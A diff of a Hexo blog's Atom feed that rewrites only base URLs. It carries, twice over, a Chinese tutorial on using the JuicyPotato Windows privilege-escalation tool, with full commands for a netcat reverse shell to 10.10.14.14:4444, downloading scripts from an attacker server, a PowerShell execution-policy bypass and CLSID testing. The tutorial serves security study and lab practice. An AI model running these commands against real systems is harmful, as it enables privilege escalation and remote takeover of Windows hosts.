@@ -5,9 +5,9 @@
   
   <link href="/atom.xml" rel="self"/>
   
-  <link href="https://github.com/"/>
+  <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/"/>
   <updated>2020-04-22T10:06:21.531Z</updated>
-  <id>https://github.com/</id>
+  <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/</id>
   
   <author>
     <name>John Doe</name>
@@ -18,12 +18,12 @@
   
   <entry>
     <title>JuicyPotato提权</title>
-    <link href="https://github.com/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"/>
-    <id>https://github.com/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/</id>
+    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"/>
+    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/</id>
     <published>2020-04-22T06:52:56.000Z</published>
     <updated>2020-04-22T10:06:21.531Z</updated>
     
-    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/ohpe/juicy-potato/">https://github.com/ohpe/juicy-potato/</a></p><h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广</p><p>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p><p>whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken</p><p><img src="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/1.png" alt></p><h1 id="0x02、JuicyPotato功能"><a href="#0x02、JuicyPotato功能" class="headerlink" title="0x02、JuicyPotato功能"></a>0x02、JuicyPotato功能</h1><p><strong>自主选择CLSID</strong></p><p>-c ‘clsid’         #### clsid查找：<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a> </p><p><strong>自定义COM监听端口</strong></p><p>-l <port>: COM server listen port</port></p><p><strong>COM监听地址</strong></p><p>-m <ip>: COM server listen address (default 127.0.0.1)</ip></p><p><strong>进程创建模块</strong> </p><p>-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, &lt;*&gt; try both</u></t></p><p><strong>执行指定进程或脚本</strong></p><p>-p <program>: program to launch</program></p><p><strong>为指定的执行进程选择参数</strong></p><p>-a <argument>: command line argument to pass to program (default NULL)</argument></p><p><strong>RPC服务地址</strong></p><p>-k <ip>: RPC server ip address (default 127.0.0.1)</ip></p><p><strong>RPC服务端口：</strong></p><p>-n <port>: RPC server listen port (default 135)</port></p><p><strong>支持测试模块；测试并查找clsid</strong></p><p>-z only test CLSID and print token’s user</p><h1 id="0x03、JuicyPotato使用"><a href="#0x03、JuicyPotato使用" class="headerlink" title="0x03、JuicyPotato使用"></a>0x03、JuicyPotato使用</h1><h2 id="依赖于clsid："><a href="#依赖于clsid：" class="headerlink" title="依赖于clsid："></a>依赖于clsid：</h2><pre><code>PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337COM -&gt; recv failed with error: 10038</code></pre><p>查找替换<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a>  很幸运2012 Standard中的第一条就成功了：</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/2.png" alt></p><h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>或者将paylaod写入bat，-p参数执行bat</p><pre><code>echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>RDP下提权：直接弹出一个system权限窗口</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><h1 id="0x04、CLSID快速验证"><a href="#0x04、CLSID快速验证" class="headerlink" title="0x04、CLSID快速验证"></a>0x04、CLSID快速验证</h1><p><strong>[1]获取可用CLSID列表</strong></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">提取CLSID Powershell脚本 GetCLSID.ps1</a></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1">同级目录下需要有Join-Object.ps1</a></p><p>GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)</p><pre><code>Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1powershell -ep bypass -f GetCLSID.ps1##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -</code></pre><p><strong>枚举所有满足条件的CLSID:</strong></p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}foreach($a in $CLSID){Write-Host $a.CLSID}</code></pre><p>[2]批处理调用juicypotato.exe逐个测试CLSID</p><p>test_clsid.bat:</p><pre><code>@echo off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><h1 id="0x05、限制条件"><a href="#0x05、限制条件" class="headerlink" title="0x05、限制条件"></a>0x05、限制条件</h1><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
+    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/ohpe/juicy-potato/">https://github.com/ohpe/juicy-potato/</a></p><h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广</p><p>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p><p>whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken</p><p><img src="/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/1.png" alt></p><h1 id="0x02、JuicyPotato功能"><a href="#0x02、JuicyPotato功能" class="headerlink" title="0x02、JuicyPotato功能"></a>0x02、JuicyPotato功能</h1><p><strong>自主选择CLSID</strong></p><p>-c ‘clsid’         #### clsid查找：<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a> </p><p><strong>自定义COM监听端口</strong></p><p>-l <port>: COM server listen port</port></p><p><strong>COM监听地址</strong></p><p>-m <ip>: COM server listen address (default 127.0.0.1)</ip></p><p><strong>进程创建模块</strong> </p><p>-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, &lt;*&gt; try both</u></t></p><p><strong>执行指定进程或脚本</strong></p><p>-p <program>: program to launch</program></p><p><strong>为指定的执行进程选择参数</strong></p><p>-a <argument>: command line argument to pass to program (default NULL)</argument></p><p><strong>RPC服务地址</strong></p><p>-k <ip>: RPC server ip address (default 127.0.0.1)</ip></p><p><strong>RPC服务端口：</strong></p><p>-n <port>: RPC server listen port (default 135)</port></p><p><strong>支持测试模块；测试并查找clsid</strong></p><p>-z only test CLSID and print token’s user</p><h1 id="0x03、JuicyPotato使用"><a href="#0x03、JuicyPotato使用" class="headerlink" title="0x03、JuicyPotato使用"></a>0x03、JuicyPotato使用</h1><h2 id="依赖于clsid："><a href="#依赖于clsid：" class="headerlink" title="依赖于clsid："></a>依赖于clsid：</h2><pre><code>PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337COM -&gt; recv failed with error: 10038</code></pre><p>查找替换<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a>  很幸运2012 Standard中的第一条就成功了：</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/2.png" alt></p><h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>或者将paylaod写入bat，-p参数执行bat</p><pre><code>echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>RDP下提权：直接弹出一个system权限窗口</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><h1 id="0x04、CLSID快速验证"><a href="#0x04、CLSID快速验证" class="headerlink" title="0x04、CLSID快速验证"></a>0x04、CLSID快速验证</h1><p><strong>[1]获取可用CLSID列表</strong></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">提取CLSID Powershell脚本 GetCLSID.ps1</a></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1">同级目录下需要有Join-Object.ps1</a></p><p>GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)</p><pre><code>Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1powershell -ep bypass -f GetCLSID.ps1##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -</code></pre><p><strong>枚举所有满足条件的CLSID:</strong></p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}foreach($a in $CLSID){Write-Host $a.CLSID}</code></pre><p>[2]批处理调用juicypotato.exe逐个测试CLSID</p><p>test_clsid.bat:</p><pre><code>@echo off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><h1 id="0x05、限制条件"><a href="#0x05、限制条件" class="headerlink" title="0x05、限制条件"></a>0x05、限制条件</h1><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
     
     <summary type="html">
     
@@ -42,8 +42,8 @@
   <entry>
     <title>一次注入实战引发的SQLMAP修改之路
 </title>
-    <link href="https://github.com/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"/>
-    <id>https://github.com/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/</id>
+    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"/>
+    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/</id>
     <published>2020-04-19T15:54:24.000Z</published>
     <updated>2020-04-19T16:00:55.231Z</updated>
     
@@ -65,8 +65,8 @@
   
   <entry>
     <title>从两道靶场题目看XHR</title>
-    <link href="https://github.com/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"/>
-    <id>https://github.com/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/</id>
+    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"/>
+    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/</id>
     <published>2020-04-19T15:51:48.000Z</published>
     <updated>2020-04-19T15:53:35.592Z</updated>
     
@@ -88,8 +88,8 @@
   
   <entry>
     <title>multi-ways-file-download</title>
-    <link href="https://github.com/2020/04/19/multi-ways-file-download/"/>
-    <id>https://github.com/2020/04/19/multi-ways-file-download/</id>
+    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/multi-ways-file-download/"/>
+    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/multi-ways-file-download/</id>
     <published>2020-04-19T13:32:17.000Z</published>
     <updated>2020-04-19T13:32:58.437Z</updated>
     
@@ -112,8 +112,8 @@
   
   <entry>
     <title>Rerverse_shell&amp;Interactive_shell</title>
-    <link href="https://github.com/2020/04/19/Rerverse-shell-Interactive-shell/"/>
-    <id>https://github.com/2020/04/19/Rerverse-shell-Interactive-shell/</id>
+    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/Rerverse-shell-Interactive-shell/"/>
+    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/Rerverse-shell-Interactive-shell/</id>
     <published>2020-04-19T12:38:26.000Z</published>
     <updated>2020-04-19T12:39:09.332Z</updated>
     
@@ -134,8 +134,8 @@
   
   <entry>
     <title>PDO&amp;&amp;InjectionBypass</title>
-    <link href="https://github.com/2020/02/21/PDO&amp;&amp;InjectionBypass/"/>
-    <id>https://github.com/2020/02/21/PDO&amp;&amp;InjectionBypass/</id>
+    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/02/21/PDO&amp;&amp;InjectionBypass/"/>
+    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/02/21/PDO&amp;&amp;InjectionBypass/</id>
     <published>2020-02-21T11:34:45.899Z</published>
     <updated>2020-02-21T18:21:45.850Z</updated>
     
